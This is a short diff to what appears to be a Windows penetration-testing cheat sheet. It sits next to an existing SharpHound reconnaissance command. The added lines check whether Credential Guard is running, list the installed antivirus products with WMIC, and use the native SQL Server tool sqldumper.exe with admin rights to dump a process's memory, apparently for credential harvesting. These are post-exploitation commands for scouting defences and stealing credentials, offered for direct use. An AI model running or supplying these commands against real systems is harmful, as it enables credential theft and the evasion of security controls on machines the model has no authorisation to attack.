@@ -182,3 +182,16 @@ sharphound.exe -c all
 
 #Import/Export VPN Connections on Windows 10/11
 %AppData%\Microsoft\Network\Connections
+
+
+# check if credential guard is running on windows
+$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
+if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
+if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
+
+# List antivirus (defender or thirdparty) on windows
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+
+#dump with sqldumper.exe (native sqlserver tool)
+#requires admin privilege
+"c:\program files\microsoft sql server\150\shared\sqldumper.exe" 858
